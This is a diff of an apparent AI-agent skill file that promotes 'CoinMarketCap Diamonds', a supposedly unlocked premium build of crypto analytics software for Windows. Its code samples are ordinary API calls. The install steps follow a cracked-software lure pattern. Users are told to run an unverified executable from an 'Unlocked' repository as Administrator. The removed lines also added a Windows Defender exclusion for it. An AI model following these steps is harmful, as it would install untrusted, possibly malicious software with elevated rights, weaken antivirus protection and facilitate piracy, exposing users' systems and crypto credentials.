@@ -1,85 +1,63 @@
 ---
 name: coinmarketcap-diamonds-premium-analytics
-description: CoinMarketCap Diamonds premium build with unlocked pro features for crypto trading analytics on Windows
+description: CoinMarketCap Diamonds premium analytics tool for cryptocurrency trading data and blockchain insights on Windows
 triggers:
-  - "analyze cryptocurrency market data with CoinMarketCap Diamonds"
-  - "use CoinMarketCap premium analytics features"
-  - "set up CoinMarketCap Diamonds trading tools"
-  - "access pro crypto analytics with Diamonds"
-  - "configure CoinMarketCap premium build"
-  - "troubleshoot CoinMarketCap Diamonds installation"
-  - "use blockchain analytics with CoinMarketCap"
-  - "integrate CoinMarketCap premium API features"
+  - how do I use CoinMarketCap Diamonds for crypto analytics
+  - set up CoinMarketCap Diamonds premium features
+  - analyze cryptocurrency trading data with Diamonds
+  - get blockchain analytics from CoinMarketCap
+  - configure CoinMarketCap Diamonds on Windows
+  - troubleshoot CoinMarketCap Diamonds installation
+  - use premium analytics features in CoinMarketCap
+  - extract crypto market data with Diamonds
 ---
 
 # CoinMarketCap Diamonds Premium Analytics
 
 > Skill by [ara.so](https://ara.so) — Data Skills collection.
 
-## Overview
-
-CoinMarketCap Diamonds is a premium Windows build of CoinMarketCap analytics software with unlocked professional features. It provides advanced trading analytics, blockchain data visualization, and comprehensive cryptocurrency market intelligence tools that are typically behind a paywall.
-
-**Key Features:**
-- Premium analytics and trading indicators unlocked
-- Real-time cryptocurrency market data
-- Advanced charting and technical analysis tools
-- Portfolio tracking with pro features
-- Blockchain explorer integration
-- Custom alerts and notifications
+CoinMarketCap Diamonds is a Windows-based premium analytics application that provides advanced cryptocurrency trading data, blockchain analytics, and market insights. This tool unlocks professional-grade features for comprehensive crypto market analysis.
 
 ## Installation
 
-### Windows Installation
+### Windows Setup
 
-1. **Download the build:**
-   ```bash
-   git clone https://github.com/Torrenttewarm/CoinMarketCap-Diamonds-Premium-Analytics-Unlocked.git
-   cd CoinMarketCap-Diamonds-Premium-Analytics-Unlocked
-   ```
+1. **Download the Application**
+   - Clone or download the repository
+   - Extract files to a dedicated directory (e.g., `C:\Program Files\CoinMarketCap-Diamonds`)
 
-2. **Run the installer:**
-   ```powershell
-   # Extract if compressed
-   Expand-Archive -Path CoinMarketCapDiamonds.zip -DestinationPath ./diamonds
-   
-   # Run the executable
-   ./diamonds/CoinMarketCapDiamonds.exe
-   ```
+2. **System Requirements**
+   - Windows 10 or later (64-bit)
+   - Minimum 4GB RAM
+   - Internet connection for real-time data
 
-3. **Initial setup:**
-   - Launch the application
-   - Configure data directory location
-   - Set API preferences (if using external data sources)
-
-### System Requirements
-
-- Windows 10/11 (64-bit)
-- 4GB RAM minimum (8GB recommended)
-- 500MB disk space
-- Internet connection for real-time data
+3. **Initial Configuration**
+   - Run the executable as Administrator for first-time setup
+   - Configure API credentials if required
 
 ## Configuration
 
 ### Environment Variables
 
-Set up required environment variables for API integration:
+Set up required environment variables for API access:
 
-```powershell
-# Set CoinMarketCap API key (if using API features)
-$env:CMC_API_KEY = "your-api-key-here"
+```bash
+# API Configuration
+set CMC_API_KEY=%YOUR_API_KEY%
+set CMC_API_SECRET=%YOUR_API_SECRET%
+set CMC_PREMIUM_TOKEN=%YOUR_PREMIUM_TOKEN%
 
-# Set data directory
-$env:CMC_DIAMONDS_DATA_DIR = "C:\Users\YourName\CoinMarketCapData"
+# Data Storage Path
+set CMC_DATA_PATH=C:\CoinMarketCapData
 
-# Configure cache settings
-$env:CMC_CACHE_ENABLED = "true"
-$env:CMC_CACHE_TTL = "300"
+# Cache Settings
+set CMC_CACHE_SIZE=1000
+set CMC_CACHE_TTL=300
 ```
 
 ### Configuration File
 
-Create or edit `config.json` in the installation directory:
+Create a `config.json` in the application directory:
 
 ```json
 {
@@ -89,369 +67,385 @@ Create or edit `config.json` in the installation directory:
     "retries": 3
   },
   "analytics": {
-    "premium_features_enabled": true,
-    "indicators": ["RSI", "MACD", "BB", "EMA"],
-    "refresh_interval": 60
+    "updateInterval": 60,
+    "historicalDataDays": 365,
+    "enableRealtime": true
   },
   "display": {
     "theme": "dark",
-    "default_currency": "USD",
-    "precision": 8
+    "chartRefreshRate": 5,
+    "defaultCurrency": "USD"
   },
-  "alerts": {
-    "enabled": true,
-    "notification_method": "desktop"
+  "export": {
+    "format": "csv",
+    "outputPath": "./exports",
+    "includeMetadata": true
   }
 }
 ```
 
-## Core Features
+## Key Features & Usage
 
-### Market Data Access
+### Market Data Retrieval
 
-**Fetching cryptocurrency prices:**
+Access real-time and historical cryptocurrency data:
 
-```javascript
-// Using the built-in API wrapper
-const Diamonds = require('./diamonds-sdk');
+```python
+# Example Python integration script
+import requests
+import json
+import os
 
-// Initialize client
-const client = new Diamonds.Client({
-  apiKey: process.env.CMC_API_KEY,
-  premiumEnabled: true
-});
-
-// Get latest market data
-async function getMarketData(symbols) {
-  try {
-    const data = await client.getLatestQuotes({
-      symbols: symbols,
-      convert: 'USD'
-    });
+class CoinMarketCapDiamonds:
+    def __init__(self):
+        self.api_key = os.getenv('CMC_API_KEY')
+        self.base_url = 'https://pro-api.coinmarketcap.com/v1'
+        self.headers = {
+            'X-CMC_PRO_API_KEY': self.api_key,
+            'Accept': 'application/json'
+        }
     
-    return data.data.map(coin => ({
-      symbol: coin.symbol,
-      price: coin.quote.USD.price,
-      volume24h: coin.quote.USD.volume_24h,
-      percentChange24h: coin.quote.USD.percent_change_24h
-    }));
-  } catch (error) {
-    console.error('Market data fetch failed:', error);
-    throw error;
-  }
-}
+    def get_latest_listings(self, limit=100, convert='USD'):
+        """Fetch latest cryptocurrency listings"""
+        endpoint = f'{self.base_url}/cryptocurrency/listings/latest'
+        params = {
+            'limit': limit,
+            'convert': convert
+        }
+        
+        response = requests.get(endpoint, headers=self.headers, params=params)
+        return response.json()
+    
+    def get_quotes(self, symbols, convert='USD'):
+        """Get quotes for specific cryptocurrencies"""
+        endpoint = f'{self.base_url}/cryptocurrency/quotes/latest'
+        params = {
+            'symbol': ','.join(symbols),
+            'convert': convert
+        }
+        
+        response = requests.get(endpoint, headers=self.headers, params=params)
+        return response.json()
+    
+    def get_historical_data(self, symbol, start_date, end_date):
+        """Retrieve historical OHLCV data"""
+        endpoint = f'{self.base_url}/cryptocurrency/ohlcv/historical'
+        params = {
+            'symbol': symbol,
+            'time_start': start_date,
+            'time_end': end_date,
+            'interval': 'daily'
+        }
+        
+        response = requests.get(endpoint, headers=self.headers, params=params)
+        return response.json()
 
-// Example usage
-const topCoins = await getMarketData(['BTC', 'ETH', 'BNB', 'SOL']);
-console.log(topCoins);
+# Usage
+cmc = CoinMarketCapDiamonds()
+listings = cmc.get_latest_listings(limit=50)
+print(json.dumps(listings, indent=2))
 ```
 
 ### Advanced Analytics
 
-**Technical indicators with premium features:**
+Perform technical analysis on cryptocurrency data:
 
-```javascript
-// Calculate RSI with premium settings
-async function calculateRSI(symbol, period = 14, timeframe = '1h') {
-  const historicalData = await client.getHistoricalData({
-    symbol: symbol,
-    timeframe: timeframe,
-    limit: period * 2
-  });
-  
-  const prices = historicalData.map(d => d.close);
-  
-  let gains = 0, losses = 0;
-  for (let i = 1; i < prices.length; i++) {
-    const change = prices[i] - prices[i - 1];
-    if (change > 0) gains += change;
-    else losses += Math.abs(change);
-  }
-  
-  const avgGain = gains / period;
-  const avgLoss = losses / period;
-  const rs = avgGain / avgLoss;
-  const rsi = 100 - (100 / (1 + rs));
-  
-  return {
-    symbol: symbol,
-    rsi: rsi,
-    signal: rsi > 70 ? 'overbought' : rsi < 30 ? 'oversold' : 'neutral'
-  };
-}
+```python
+import pandas as pd
+import numpy as np
+
+class CryptoAnalytics:
+    def __init__(self, data):
+        self.df = pd.DataFrame(data)
+    
+    def calculate_moving_average(self, window=20):
+        """Calculate moving average"""
+        self.df['MA'] = self.df['close'].rolling(window=window).mean()
+        return self.df
+    
+    def calculate_rsi(self, period=14):
+        """Calculate Relative Strength Index"""
+        delta = self.df['close'].diff()
+        gain = (delta.where(delta > 0, 0)).rolling(window=period).mean()
+        loss = (-delta.where(delta < 0, 0)).rolling(window=period).mean()
+        
+        rs = gain / loss
+        rsi = 100 - (100 / (1 + rs))
+        self.df['RSI'] = rsi
+        return self.df
+    
+    def calculate_volatility(self, window=30):
+        """Calculate rolling volatility"""
+        returns = self.df['close'].pct_change()
+        self.df['Volatility'] = returns.rolling(window=window).std() * np.sqrt(365)
+        return self.df
+    
+    def export_analysis(self, filename):
+        """Export analysis results"""
+        output_path = os.getenv('CMC_DATA_PATH', './output')
+        filepath = os.path.join(output_path, filename)
+        self.df.to_csv(filepath, index=False)
+        print(f"Analysis exported to {filepath}")
+
+# Usage
+historical_data = cmc.get_historical_data('BTC', '2025-01-01', '2026-01-01')
+analytics = CryptoAnalytics(historical_data['data']['quotes'])
+analytics.calculate_moving_average(window=50)
+analytics.calculate_rsi(period=14)
+analytics.export_analysis('btc_analysis.csv')
 ```
 
 ### Portfolio Tracking
 
-**Managing portfolio with premium features:**
+Monitor and analyze cryptocurrency portfolios:
 
-```javascript
-class PortfolioManager {
-  constructor(client) {
-    this.client = client;
-    this.holdings = [];
-  }
-  
-  async addHolding(symbol, amount, purchasePrice) {
-    this.holdings.push({
-      symbol: symbol,
-      amount: amount,
-      purchasePrice: purchasePrice,
-      addedAt: new Date()
-    });
-  }
-  
-  async getPortfolioValue() {
-    const symbols = this.holdings.map(h => h.symbol);
-    const currentPrices = await this.client.getLatestQuotes({ symbols });
+```python
+class PortfolioTracker:
+    def __init__(self, cmc_client):
+        self.cmc = cmc_client
+        self.holdings = {}
     
-    let totalValue = 0;
-    let totalCost = 0;
+    def add_holding(self, symbol, amount, purchase_price):
+        """Add cryptocurrency holding"""
+        self.holdings[symbol] = {
+            'amount': amount,
+            'purchase_price': purchase_price
+        }
     
-    const summary = this.holdings.map(holding => {
-      const currentPrice = currentPrices.data
-        .find(d => d.symbol === holding.symbol)
-        .quote.USD.price;
-      
-      const currentValue = holding.amount * currentPrice;
-      const costBasis = holding.amount * holding.purchasePrice;
-      const profitLoss = currentValue - costBasis;
-      const profitLossPercent = (profitLoss / costBasis) * 100;
-      
-      totalValue += currentValue;
-      totalCost += costBasis;
-      
-      return {
-        symbol: holding.symbol,
-        amount: holding.amount,
-        currentPrice: currentPrice,
-        currentValue: currentValue,
-        profitLoss: profitLoss,
-        profitLossPercent: profitLossPercent
-      };
-    });
-    
-    return {
-      holdings: summary,
-      totalValue: totalValue,
-      totalCost: totalCost,
-      totalProfitLoss: totalValue - totalCost,
-      totalProfitLossPercent: ((totalValue - totalCost) / totalCost) * 100
-    };
-  }
-}
+    def calculate_portfolio_value(self):
+        """Calculate current portfolio value"""
+        symbols = list(self.holdings.keys())
+        quotes = self.cmc.get_quotes(symbols)
+        
+        total_value = 0
+        portfolio_data = []
+        
+        for symbol, holding in self.holdings.items():
+            current_price = quotes['data'][symbol]['quote']['USD']['price']
+            holding_value = holding['amount'] * current_price
+            cost_basis = holding['amount'] * holding['purchase_price']
+            profit_loss = holding_value - cost_basis
+            profit_loss_pct = (profit_loss / cost_basis) * 100
+            
+            portfolio_data.append({
+                'symbol': symbol,
+                'amount': holding['amount'],
+                'current_price': current_price,
+                'value': holding_value,
+                'profit_loss': profit_loss,
+                'profit_loss_pct': profit_loss_pct
+            })
+            
+            total_value += holding_value
+        
+        return {
+            'total_value': total_value,
+            'holdings': portfolio_data
+        }
 
-// Usage
-const portfolio = new PortfolioManager(client);
-await portfolio.addHolding('BTC', 0.5, 45000);
-await portfolio.addHolding('ETH', 5, 3000);
+# Usage
+tracker = PortfolioTracker(cmc)
+tracker.add_holding('BTC', 0.5, 45000)
+tracker.add_holding('ETH', 5.0, 3000)
+tracker.add_holding('ADA', 1000, 1.2)
 
-const summary = await portfolio.getPortfolioValue();
-console.log('Portfolio Summary:', summary);
-```
-
-### Custom Alerts
-
-**Setting up price alerts:**
-
-```javascript
-class AlertManager {
-  constructor(client) {
-    this.client = client;
-    this.alerts = [];
-  }
-  
-  createPriceAlert(symbol, condition, targetPrice, callback) {
-    const alert = {
-      id: Date.now(),
-      symbol: symbol,
-      condition: condition, // 'above' or 'below'
-      targetPrice: targetPrice,
-      callback: callback,
-      active: true
-    };
-    
-    this.alerts.push(alert);
-    return alert.id;
-  }
-  
-  async checkAlerts() {
-    const activeAlerts = this.alerts.filter(a => a.active);
-    const symbols = [...new Set(activeAlerts.map(a => a.symbol))];
-    
-    const prices = await this.client.getLatestQuotes({ symbols });
-    
-    activeAlerts.forEach(alert => {
-      const currentPrice = prices.data
-        .find(d => d.symbol === alert.symbol)
-        .quote.USD.price;
-      
-      let triggered = false;
-      if (alert.condition === 'above' && currentPrice >= alert.targetPrice) {
-        triggered = true;
-      } else if (alert.condition === 'below' && currentPrice <= alert.targetPrice) {
-        triggered = true;
-      }
-      
-      if (triggered) {
-        alert.callback({
-          symbol: alert.symbol,
-          currentPrice: currentPrice,
-          targetPrice: alert.targetPrice,
-          condition: alert.condition
-        });
-        alert.active = false;
-      }
-    });
-  }
-  
-  startMonitoring(intervalMs = 60000) {
-    setInterval(() => this.checkAlerts(), intervalMs);
-  }
-}
-
-// Usage
-const alertManager = new AlertManager(client);
-
-alertManager.createPriceAlert('BTC', 'above', 50000, (data) => {
-  console.log(`🚀 Alert: ${data.symbol} reached $${data.currentPrice}`);
-});
-
-alertManager.startMonitoring();
+portfolio = tracker.calculate_portfolio_value()
+print(f"Total Portfolio Value: ${portfolio['total_value']:,.2f}")
+for holding in portfolio['holdings']:
+    print(f"{holding['symbol']}: ${holding['value']:,.2f} ({holding['profit_loss_pct']:.2f}%)")
 ```
 
 ## Common Patterns
 
-### Batch Data Retrieval
+### Real-time Price Monitoring
 
-```javascript
-async function getBatchMarketData(symbols, batchSize = 100) {
-  const results = [];
-  
-  for (let i = 0; i < symbols.length; i += batchSize) {
-    const batch = symbols.slice(i, i + batchSize);
-    const data = await client.getLatestQuotes({ symbols: batch });
-    results.push(...data.data);
+```python
+import time
+from datetime import datetime
+
+def monitor_prices(symbols, threshold_pct=5):
+    """Monitor prices for significant changes"""
+    cmc = CoinMarketCapDiamonds()
+    last_prices = {}
     
-    // Rate limiting
-    await new Promise(resolve => setTimeout(resolve, 1000));
-  }
-  
-  return results;
-}
+    while True:
+        try:
+            quotes = cmc.get_quotes(symbols)
+            
+            for symbol in symbols:
+                current_price = quotes['data'][symbol]['quote']['USD']['price']
+                
+                if symbol in last_prices:
+                    change_pct = ((current_price - last_prices[symbol]) / last_prices[symbol]) * 100
+                    
+                    if abs(change_pct) >= threshold_pct:
+                        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                        print(f"[{timestamp}] ALERT: {symbol} changed {change_pct:.2f}% to ${current_price:,.2f}")
+                
+                last_prices[symbol] = current_price
+            
+            time.sleep(60)  # Check every minute
+            
+        except Exception as e:
+            print(f"Error monitoring prices: {e}")
+            time.sleep(60)
+
+# Usage
+monitor_prices(['BTC', 'ETH', 'BNB'], threshold_pct=3)
 ```
 
-### Historical Data Analysis
+### Data Export and Reporting
 
-```javascript
-async function analyzeHistoricalTrend(symbol, days = 30) {
-  const data = await client.getHistoricalData({
-    symbol: symbol,
-    interval: '1d',
-    limit: days
-  });
-  
-  const closes = data.map(d => d.close);
-  const firstPrice = closes[0];
-  const lastPrice = closes[closes.length - 1];
-  const change = ((lastPrice - firstPrice) / firstPrice) * 100;
-  
-  const high = Math.max(...closes);
-  const low = Math.min(...closes);
-  const volatility = ((high - low) / low) * 100;
-  
-  return {
-    symbol: symbol,
-    periodDays: days,
-    priceChange: change,
-    volatility: volatility,
-    trend: change > 0 ? 'bullish' : 'bearish'
-  };
-}
+```python
+def generate_market_report(symbols, output_format='csv'):
+    """Generate comprehensive market report"""
+    cmc = CoinMarketCapDiamonds()
+    quotes = cmc.get_quotes(symbols)
+    
+    report_data = []
+    for symbol in symbols:
+        data = quotes['data'][symbol]
+        quote = data['quote']['USD']
+        
+        report_data.append({
+            'Symbol': symbol,
+            'Name': data['name'],
+            'Price': quote['price'],
+            'Market Cap': quote['market_cap'],
+            '24h Volume': quote['volume_24h'],
+            '24h Change': quote['percent_change_24h'],
+            '7d Change': quote['percent_change_7d'],
+            'Circulating Supply': data['circulating_supply']
+        })
+    
+    df = pd.DataFrame(report_data)
+    
+    output_path = os.getenv('CMC_DATA_PATH', './reports')
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    
+    if output_format == 'csv':
+        filename = f'market_report_{timestamp}.csv'
+        df.to_csv(os.path.join(output_path, filename), index=False)
+    elif output_format == 'json':
+        filename = f'market_report_{timestamp}.json'
+        df.to_json(os.path.join(output_path, filename), orient='records', indent=2)
+    
+    print(f"Report generated: {filename}")
+    return df
+
+# Usage
+report = generate_market_report(['BTC', 'ETH', 'XRP', 'ADA', 'SOL'], output_format='csv')
+print(report.head())
 ```
 
 ## Troubleshooting
 
-### Application Won't Launch
-
-```powershell
-# Check Windows Defender/Antivirus isn't blocking
-# Add exclusion for the installation directory
-Add-MpPreference -ExclusionPath "C:\Path\To\CoinMarketCapDiamonds"
-
-# Run as administrator if permission issues
-Start-Process -FilePath ".\CoinMarketCapDiamonds.exe" -Verb RunAs
-```
-
 ### API Connection Issues
 
-```javascript
-// Verify API connectivity
-async function testConnection() {
-  try {
-    const test = await client.getLatestQuotes({ symbols: ['BTC'] });
-    console.log('✓ API connection successful');
-    return true;
-  } catch (error) {
-    console.error('✗ API connection failed:', error.message);
-    
-    // Check common issues
-    if (error.code === 'ENOTFOUND') {
-      console.log('DNS resolution failed - check internet connection');
-    } else if (error.response?.status === 401) {
-      console.log('Authentication failed - check API key');
-    } else if (error.response?.status === 429) {
-      console.log('Rate limit exceeded - reduce request frequency');
-    }
-    
-    return false;
-  }
-}
+**Problem**: Unable to connect to CoinMarketCap API
+
+**Solutions**:
+- Verify API key is correctly set: `echo %CMC_API_KEY%`
+- Check internet connectivity
+- Confirm API endpoint is accessible
+- Review rate limits (free tier: 333 requests/day)
+
+### Data Export Failures
+
+**Problem**: Export operations failing
+
+**Solutions**:
+```python
+# Ensure output directory exists
+import os
+
+output_path = os.getenv('CMC_DATA_PATH', './output')
+os.makedirs(output_path, exist_ok=True)
+
+# Add error handling to exports
+try:
+    df.to_csv(filepath, index=False)
+    print(f"Successfully exported to {filepath}")
+except PermissionError:
+    print(f"Permission denied: {filepath}")
+except Exception as e:
+    print(f"Export failed: {e}")
 ```
 
-### Data Not Updating
+### Memory Issues with Large Datasets
 
-```javascript
-// Force refresh cache
-async function forceRefresh() {
-  await client.clearCache();
-  const freshData = await client.getLatestQuotes({
-    symbols: ['BTC', 'ETH'],
-    skipCache: true
-  });
-  console.log('Cache cleared, fresh data retrieved');
-  return freshData;
-}
+**Problem**: Application crashes with large historical data requests
+
+**Solutions**:
+```python
+# Process data in chunks
+def fetch_historical_chunked(symbol, start_date, end_date, chunk_days=30):
+    """Fetch historical data in chunks to avoid memory issues"""
+    from datetime import datetime, timedelta
+    
+    start = datetime.strptime(start_date, '%Y-%m-%d')
+    end = datetime.strptime(end_date, '%Y-%m-%d')
+    
+    all_data = []
+    current = start
+    
+    while current < end:
+        chunk_end = min(current + timedelta(days=chunk_days), end)
+        
+        chunk_data = cmc.get_historical_data(
+            symbol,
+            current.strftime('%Y-%m-%d'),
+            chunk_end.strftime('%Y-%m-%d')
+        )
+        
+        all_data.extend(chunk_data['data']['quotes'])
+        current = chunk_end
+    
+    return all_data
 ```
 
-### Performance Optimization
+### Rate Limiting
 
-```javascript
-// Enable data compression and caching
-const optimizedClient = new Diamonds.Client({
-  apiKey: process.env.CMC_API_KEY,
-  compression: true,
-  cache: {
-    enabled: true,
-    ttl: 300, // 5 minutes
-    maxSize: 100
-  },
-  requestTimeout: 10000
-});
+**Problem**: API rate limit exceeded
+
+**Solutions**:
+```python
+import time
+from functools import wraps
+
+def rate_limit(calls_per_minute=30):
+    """Decorator to enforce rate limiting"""
+    min_interval = 60.0 / calls_per_minute
+    last_called = [0.0]
+    
+    def decorator(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            elapsed = time.time() - last_called[0]
+            left_to_wait = min_interval - elapsed
+            
+            if left_to_wait > 0:
+                time.sleep(left_to_wait)
+            
+            ret = func(*args, **kwargs)
+            last_called[0] = time.time()
+            return ret
+        return wrapper
+    return decorator
+
+# Apply to API calls
+@rate_limit(calls_per_minute=20)
+def safe_get_quotes(symbols):
+    return cmc.get_quotes(symbols)
 ```
 
 ## Best Practices
 
-1. **Rate Limiting**: Respect API rate limits by implementing delays between requests
-2. **Error Handling**: Always wrap API calls in try-catch blocks
-3. **Data Validation**: Validate received data before processing
-4. **Caching**: Use caching for frequently accessed data
-5. **Security**: Never hardcode API keys; use environment variables
-6. **Logging**: Implement comprehensive logging for debugging
-
-## Resources
-
-- Premium analytics features require proper configuration
-- For real-time data, ensure stable internet connection
-- Monitor system resources when running intensive analytics
-- Regular updates may be available through the repository
+1. **Always use environment variables** for API credentials
+2. **Implement error handling** for all API calls
+3. **Cache frequently accessed data** to minimize API calls
+4. **Use batch requests** when fetching multiple assets
+5. **Monitor rate limits** and implement backoff strategies
+6. **Validate data** before performing analytics
+7. **Export results regularly** to avoid data loss
+8. **Keep historical data local** for offline analysis
